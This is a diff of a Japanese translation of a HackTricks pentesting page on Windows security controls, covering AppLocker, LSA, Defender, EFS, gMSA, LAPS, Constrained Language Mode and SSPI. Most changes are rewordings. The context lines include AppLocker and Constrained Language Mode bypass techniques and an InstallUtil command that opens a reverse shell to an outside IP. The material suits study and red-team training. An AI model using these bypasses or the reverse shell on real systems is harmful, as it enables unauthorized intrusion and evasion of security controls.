@@ -2,22 +2,22 @@
 
 <details>
 
-<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
+<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>
 
 HackTricksをサポートする他の方法：
 
-- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-- [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
-- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
-- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)をフォローする。
-- **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)のGitHubリポジトリにPRを提出して、あなたのハッキングテクニックを共有してください。
+- **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
+- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
+- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)をフォローする
+- **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有する
 
 </details>
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
-今すぐアクセスしてください：
+[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
+今すぐアクセスを取得：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
@@ -53,11 +53,11 @@ C:\Windows\Tasks
 C:\windows\tracing
 ```
 * 一般的に**信頼される**[**"LOLBAS's"**](https://lolbas-project.github.io/) バイナリはAppLockerをバイパスするのに役立つことがあります。
-* **不適切に書かれた規則はバイパスされる可能性があります**
-* たとえば、**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**のような場合、**`allowed`**という名前のフォルダをどこにでも作成することができ、許可されます。
+* **不適切に書かれたルールもバイパスされる可能性があります**
+* たとえば、**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**のような場合、**`allowed`**という名前の**フォルダ**をどこにでも作成することができ、許可されます。
 * 組織はしばしば**`%System32%\WindowsPowerShell\v1.0\powershell.exe`実行可能ファイルをブロック**することに焦点を当てますが、**他の**[**PowerShell実行可能ファイルの場所**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations)、たとえば`%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`や`PowerShell_ISE.exe`などを忘れがちです。
 * **DLLの強制は非常にまれに有効化**されます。システムにかかる追加負荷と、何も壊れないことを確認するために必要なテストの量が理由です。そのため、**DLLをバックドアとして使用するとAppLockerをバイパス**できます。
-* [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)や[**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)を使用して、任意のプロセスで**PowerShellコードを実行**し、AppLockerをバイパスできます。詳細については、[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)を参照してください。
+* [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)や[**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)を使用して、任意のプロセスで**PowerShellコードを実行**し、AppLockerをバイパスすることができます。詳細については、[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)を参照してください。
 
 ## 資格情報の保存
 
@@ -71,7 +71,7 @@ C:\windows\tracing
 **LSA**は、ローカルの**セキュリティポリシー**（パスワードポリシー、ユーザー権限など）、**認証**、**アクセス証明書**などを管理します。\
 LSAは、ローカルログインのために**提供された資格情報をSAMファイル内で確認**し、ドメインユーザーを認証するために**ドメインコントローラーと通信**します。
 
-**資格情報**は、**LSASSプロセス内に保存**されます：Kerberosチケット、NTおよびLMのハッシュ、簡単に復号化できるパスワード。
+**資格情報**は、**LSASSプロセス内**に保存されます：Kerberosチケット、ハッシュNTおよびLM、簡単に復号化できるパスワード。
 
 ### LSAシークレット
 
@@ -88,11 +88,11 @@ LSAはディスクにいくつかの資格情報を保存することがあり�
 
 ## Defender
 
-[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender)は、Windows 10やWindows 11、およびWindows Serverのバージョンで利用可能なアンチウイルスソフトウェアです。**`WinPEAS`**などの一般的なペンテストツールを**ブロック**します。ただし、これらの保護を**バイパス**する方法があります。
+[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender)は、Windows 10やWindows 11、およびWindows Serverのバージョンで利用可能なアンチウイルスソフトウェアです。**`WinPEAS`**などの一般的なペンテストツールを**ブロック**します。ただし、これらの保護を**バイパスする方法**があります。
 
 ### チェック
 
-**Defender**の**状態**を確認するには、PSコマンドレット**`Get-MpComputerStatus`**を実行できます（**`RealTimeProtectionEnabled`**の値を確認してアクティブかどうかを知る）：
+**Defender**の**ステータス**を確認するには、PSコマンドレット**`Get-MpComputerStatus`**を実行できます（**`RealTimeProtectionEnabled`**の値を確認してアクティブかどうかを知る）:
 
 <pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus
 
@@ -111,7 +111,7 @@ NISEngineVersion                : 0.0.0.0
 PSComputerName                  :
 </code></pre>
 
-列挙するためには、次のコマンドも実行できます：
+列挙するためには、次のコマンドを実行することもできます:
 ```bash
 WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
 wmic /namespace:\\root\securitycenter2 path antivirusproduct
@@ -122,7 +122,7 @@ sc query windefend
 ```
 ## 暗号化ファイルシステム（EFS）
 
-EFSは、**ファイル暗号化キー（FEK）**として知られる**対称キー**を利用して、ファイルを暗号化して保護します。このキーはユーザーの**公開鍵**で暗号化され、暗号化されたファイルの$EFS **代替データストリーム**に格納されます。復号化が必要な場合、ユーザーのデジタル証明書の対応する**秘密鍵**が使用され、$EFSストリームからFEKを復号化します。詳細は[こちら](https://en.wikipedia.org/wiki/Encrypting\_File\_System)で確認できます。
+EFSは、**対称鍵**である**ファイル暗号化キー（FEK）**として知られる鍵を使用して、ファイルを暗号化して保護します。このキーはユーザーの**公開鍵**で暗号化され、暗号化されたファイルの$EFS **代替データストリーム**に保存されます。復号化が必要な場合、ユーザーのデジタル証明書の対応する**秘密鍵**が使用され、$EFSストリームからFEKを復号化します。詳細は[こちら](https://en.wikipedia.org/wiki/Encrypting\_File\_System)で確認できます。
 
 **ユーザーの起動なしでの復号化シナリオ**には次のものがあります：
 
@@ -142,7 +142,7 @@ EFSは、**ファイル暗号化キー（FEK）**として知られる**対称�
 
 このパスが存在するかどうかを確認して、**ユーザー**がこの**サービス**を**使用**したかどうかを確認します：`C:\users\<username>\appdata\roaming\Microsoft\Protect`
 
-`cipher /c \<file>`を使用して、ファイルに**アクセス**権を持つ**ユーザー**を確認できます。また、フォルダ内で`cipher /e`および`cipher /d`を使用して、すべてのファイルを**暗号化**および**復号**できます。
+`cipher /c \<file>`を使用して、ファイルに**アクセス**権を持つ**ユーザー**を確認できます。フォルダ内で`cipher /e`および`cipher /d`を使用して、すべてのファイルを**暗号化**および**復号化**できます。
 
 ### EFSファイルの復号化
 
@@ -162,7 +162,7 @@ Microsoftは、ITインフラストラクチャ内のサービスアカウント
 - **強化されたセキュリティ**：これらのアカウントはロックアウトの影響を受けず、対話型ログインに使用することはできません。これによりセキュリティが向上します。
 - **複数ホストのサポート**：gMSAは複数のホストで共有できるため、複数のサーバーで実行されるサービスに最適です。
 - **スケジュールされたタスクの機能**：管理されたサービスアカウントとは異なり、gMSAはスケジュールされたタスクの実行をサポートします。
-- **簡素化されたSPN管理**：コンピューターのsAMaccountの詳細やDNS名の変更がある場合、システムは自動的にService Principal Name（SPN）を更新し、SPNの管理を簡素化します。
+- **簡素化されたSPN管理**：コンピューターのsAMaccountの詳細やDNS名に変更がある場合、システムは自動的にService Principal Name（SPN）を更新するため、SPNの管理が簡素化されます。
 
 gMSAのパスワードはLDAPプロパティ_**msDS-ManagedPassword**_に保存され、ドメインコントローラー（DC）によって30日ごとに自動的にリセットされます。このパスワードは、[MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)として知られる暗号化されたデータブロブであり、認証された管理者およびgMSAがインストールされているサーバーのみが取得できます。この情報にアクセスするには、LDAPSなどのセキュアな接続が必要です。または、接続は'Sealing & Secure'で認証する必要があります。
 
@@ -178,7 +178,7 @@ gMSAのパスワードはLDAPプロパティ_**msDS-ManagedPassword**_に保存�
 
 ## LAPS
 
-**Local Administrator Password Solution (LAPS)** は、[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899)からダウンロードでき、ローカル管理者パスワードの管理を可能にします。これらのパスワードは**ランダム化**され、ユニークで**定期的に変更**され、Active Directoryに中央集約されています。これらのパスワードへのアクセスは、承認されたユーザーに対してACLを介して制限されています。適切な権限が付与されると、ローカル管理者パスワードを読み取る機能が提供されます。
+**Local Administrator Password Solution (LAPS)** は、[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899)からダウンロードでき、ローカル管理者パスワードの管理を可能にします。これらのパスワードは**ランダム化**され、ユニークで**定期的に変更**され、Active Directoryに中央集約されています。これらのパスワードへのアクセスは、ACLを使用して認可されたユーザーに制限されています。適切な権限が付与されると、ローカル管理者パスワードを読み取る機能が提供されます。
 
 {% content-ref url="active-directory-methodology/laps.md" %}
 [laps.md](active-directory-methodology/laps.md)
@@ -186,9 +186,9 @@ gMSAのパスワードはLDAPプロパティ_**msDS-ManagedPassword**_に保存�
 
 ## PS Constrained Language Mode
 
-PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) は、PowerShellを効果的に使用するために必要な多くの機能を**制限**し、COMオブジェクトのブロック、承認された.NETタイプのみの許可、XAMLベースのワークフロー、PowerShellクラスなどを許可します。
+PowerShellの[**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)は、COMオブジェクトのブロック、承認された.NETタイプのみの許可、XAMLベースのワークフロー、PowerShellクラスなど、PowerShellを効果的に使用するために必要な多くの機能を**制限**します。
 
-### **確認**
+### **チェック**
 ```powershell
 $ExecutionContext.SessionState.LanguageMode
 #Values could be: FullLanguage or ConstrainedLanguage
@@ -198,8 +198,8 @@ $ExecutionContext.SessionState.LanguageMode
 #Easy bypass
 Powershell -version 2
 ```
-In current Windows that Bypass won't work but you can use [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
-**コンパイルするには** **次の手順が必要かもしれません** _**参照の追加**_ -> _参照の追加_ -> _参照の追加_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` を追加し、**プロジェクトを .Net4.5 に変更してください**。
+In current Windows that Bypass won't work but you can use [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).  
+**コンパイルするには**、**参照を追加する必要があるかもしれません** -> _**参照の追加**_ -> _参照の追加_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` を追加し、**プロジェクトを .Net4.5 に変更します**。
 
 #### 直接バイパス:
 ```bash
@@ -209,7 +209,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
-You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)または[**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)を使用して、**任意のプロセス**でPowershellコードを実行し、制約モードをバイパスできます。詳細については、[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)を参照してください。
+You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)または[**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)を使用して、**任意のプロセス**でPowershellコードを実行し、制約モードをバイパスできます。詳細は[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)を参照してください。
 
 ## PS実行ポリシー
 
@@ -237,9 +237,9 @@ $command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.T
 
 ユーザーの認証に使用できる API です。
 
-SSPI は、通信を行いたい2台のマシンに適切なプロトコルを見つける役割を担います。これには、Kerberos が推奨されます。その後、SSPI は使用する認証プロトコルを交渉し、これらの認証プロトコルはセキュリティ サポート プロバイダー（SSP）と呼ばれ、各Windowsマシン内にDLLの形式で配置されており、両方のマシンが同じものをサポートしている必要があります。
+SSPI は、通信を行いたい2台のマシンに適切なプロトコルを見つける役割を担います。これには、Kerberos が推奨されます。その後、SSPI は使用する認証プロトコルを交渉し、これらの認証プロトコルはセキュリティ サポート プロバイダー（SSP）と呼ばれ、各Windowsマシン内にDLLの形式で配置されており、両方のマシンが通信するためには同じものをサポートする必要があります。
 
-### 主要な SSP
+### 主要なSSP
 
 - **Kerberos**: 推奨されるもの
 - %windir%\Windows\System32\kerberos.dll
@@ -262,7 +262,7 @@ SSPI は、通信を行いたい2台のマシンに適切なプロトコルを�
 [uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
 {% endcontent-ref %}
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) を使用して、世界で最も高度なコミュニティ ツールによって強化された **ワークフローを簡単に構築** および **自動化** します。\
@@ -274,14 +274,14 @@ SSPI は、通信を行いたい2台のマシンに適切なプロトコルを�
 
 <details>
 
-<summary><strong>ゼロからヒーローまでのAWSハッキングを</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>で学びましょう！</strong></summary>
+<summary><strong>**ゼロからヒーローまでのAWSハッキングを学ぶ**</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>で学びましょう！</strong></summary>
 
 HackTricks をサポートする他の方法：
 
 - **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロード** したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) を確認してください！
 - [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手してください
 - [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つけます
-- 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) をフォローしてください。
-- **HackTricks** および **HackTricks Cloud** の github リポジトリに PR を提出して、あなたのハッキングトリックを共有してください。
+- 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) または [**telegram グループ**](https://t.me/peass) に **参加** するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) を **フォロー** してください。
+- **HackTricks** および **HackTricks Cloud** の GitHub リポジトリに PR を提出して、あなたのハッキングトリックを共有してください。
 
 </details>
